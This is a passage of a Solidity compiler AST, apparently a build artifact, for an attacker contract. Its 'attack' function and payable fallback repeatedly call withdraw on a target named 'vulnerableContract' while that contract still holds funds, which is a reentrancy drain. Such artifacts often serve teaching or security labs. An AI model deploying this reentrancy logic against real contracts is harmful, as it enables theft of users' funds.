																"typeString": "literal_string \"Withdraw failed\""
															}
														],
														"id": 45,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															101,
															102
														],
														"referencedDeclaration": 102,
														"src": "675:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 48,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "675:43:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 49,
												"nodeType": "ExpressionStatement",
												"src": "675:43:0"
											}
										]
									},
									"documentation": null,
									"id": 51,
									"implemented": true,
									"isConstructor": false,
									"isDeclaredConst": false,
									"modifiers": [],
									"name": "attack",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 14,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "223:2:0"
									},
									"payable": true,
									"returnParameters": {
										"id": 15,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "241:0:0"
									},
									"scope": 83,
									"src": "208:518:0",
									"stateMutability": "payable",
									"superFunction": null,
									"visibility": "public"
								},
								{
									"body": {
										"id": 81,
										"nodeType": "Block",
										"src": "825:359:0",
										"statements": [
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 60,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 55,
																	"name": "vulnerableContract",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 3,
																	"src": "953:18:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 54,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "945:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": "address"
															},
															"id": 56,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "945:27:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"id": 57,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "balance",
														"nodeType": "MemberAccess",
														"referencedDeclaration": null,
														"src": "945:35:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": ">=",
													"rightExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 58,
															"name": "msg",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 98,
															"src": "984:3:0",
															"typeDescriptions": {
																"typeIdentifier": "t_magic_message",
																"typeString": "msg"
															}
														},
														"id": 59,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "value",
														"nodeType": "MemberAccess",
														"referencedDeclaration": null,
														"src": "984:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "945:48:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 80,
												"nodeType": "IfStatement",
												"src": "941:236:0",
												"trueBody": {
													"id": 79,
													"nodeType": "Block",
													"src": "995:182:0",
													"statements": [
														{
															"assignments": [
																62
															],
															"declarations": [
																{
																	"constant": false,
																	"id": 62,
																	"name": "withdrawSuccess",
																	"nodeType": "VariableDeclaration",
																	"scope": 82,
																	"src": "1010:20:0",
																	"stateVariable": false,
																	"storageLocation": "default",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	},
																	"typeName": {
																		"id": 61,
																		"name": "bool",
																		"nodeType": "ElementaryTypeName",
																		"src": "1010:4:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	},
																	"value": null,
																	"visibility": "internal"
																}
															],
															"id": 73,
															"initialValue": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"arguments": [
																			{
																				"argumentTypes": null,
																				"arguments": [
																					{
																						"argumentTypes": null,
																						"hexValue": "77697468647261772875696e7432353629",
																						"id": 67,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"kind": "string",
																						"lValueRequested": false,
																						"nodeType": "Literal",
																						"src": "1074:19:0",
																						"subdenomination": null,
																						"typeDescriptions": {
																							"typeIdentifier": "t_stringliteral_2e1a7d4d13322e7b96f9a57413e1525c250fb7a9021cf91d1540d5b69f16a49f",
																							"typeString": "literal_string \"withdraw(uint256)\""
																						},
																						"value": "withdraw(uint256)"
																					}
																				],
																				"expression": {
																					"argumentTypes": [
																						{
																							"typeIdentifier": "t_stringliteral_2e1a7d4d13322e7b96f9a57413e1525c250fb7a9021cf91d1540d5b69f16a49f",
																							"typeString": "literal_string \"withdraw(uint256)\""
																						}
																					],
																					"id": 66,
																					"name": "keccak256",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 92,
																					"src": "1064:9:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_function_sha3_pure$__$returns$_t_bytes32_$",
																						"typeString": "function () pure returns (bytes32)"
																					}
																				},
																				"id": 68,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "functionCall",
																				"lValueRequested": false,
																				"names": [],
																				"nodeType": "FunctionCall",
																				"src": "1064:30:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				}
																			}
																		],
																		"expression": {
																			"argumentTypes": [
																				{
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				}
																			],
																			"id": 65,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"lValueRequested": false,
																			"nodeType": "ElementaryTypeNameExpression",
																			"src": "1057:6:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_type$_t_bytes4_$",
																				"typeString": "type(bytes4)"
																			},
																			"typeName": "bytes4"
																		},
																		"id": 69,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "typeConversion",
																		"lValueRequested": false,
																		"names": [],
																		"nodeType": "FunctionCall",
																		"src": "1057:38:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bytes4",
																			"typeString": "bytes4"
																		}
																	},
																	{
																		"argumentTypes": null,
																		"expression": {
																			"argumentTypes": null,
																			"id": 70,
																			"name": "msg",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 98,
																			"src": "1097:3:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_magic_message",
																				"typeString": "msg"
																			}
																		},
																		"id": 71,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"memberName": "value",
																		"nodeType": "MemberAccess",
																		"referencedDeclaration": null,
																		"src": "1097:9:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_bytes4",
																			"typeString": "bytes4"
																		},
																		{
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	],
																	"expression": {
																		"argumentTypes": null,
																		"id": 63,
																		"name": "vulnerableContract",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 3,
																		"src": "1033:18:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	},
																	"id": 64,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"memberName": "call",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": null,
																	"src": "1033:23:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_barecall_payable$__$returns$_t_bool_$",
																		"typeString": "function () payable returns (bool)"
																	}
																},
																"id": 72,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "1033:74:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"nodeType": "VariableDeclarationStatement",
															"src": "1010:97:0"
														},
														{
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 75,
																		"name": "withdrawSuccess",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 62,
																		"src": "1130:15:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	},
																	{
																		"argumentTypes": null,
																		"hexValue": "5769746864726177206661696c6564",
																		"id": 76,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "string",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "1147:17:0",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_stringliteral_2bbe70e6500e9642f2862dc923170a5f09b5a43a51b0f2c3488a318564bb6925",
																			"typeString": "literal_string \"Withdraw failed\""
																		},
																		"value": "Withdraw failed"
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		},
																		{
																			"typeIdentifier": "t_stringliteral_2bbe70e6500e9642f2862dc923170a5f09b5a43a51b0f2c3488a318564bb6925",
																			"typeString": "literal_string \"Withdraw failed\""
																		}
																	],
																	"id": 74,
																	"name": "require",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [
																		101,
																		102
																	],
																	"referencedDeclaration": 102,
																	"src": "1122:7:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
																		"typeString": "function (bool,string memory) pure"
																	}
																},
																"id": 77,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "1122:43:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_tuple$__$",
																	"typeString": "tuple()"
																}
															},
															"id": 78,
															"nodeType": "ExpressionStatement",
															"src": "1122:43:0"
														}
													]
												}
											}
										]
									},
									"documentation": null,
									"id": 82,
									"implemented": true,
									"isConstructor": false,
									"isDeclaredConst": false,
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 52,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "807:2:0"
									},
									"payable": true,
									"returnParameters": {
										"id": 53,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "825:0:0"
									},
									"scope": 83,
									"src": "798:386:0",
									"stateMutability": "payable",
									"superFunction": null,
									"visibility": "public"
								}
							],
							"scope": 84,
							"src": "28:1159:0"
						}
					],
					"src": "0:1187:0"
				},
				"id": 0
			}
		}
	}
}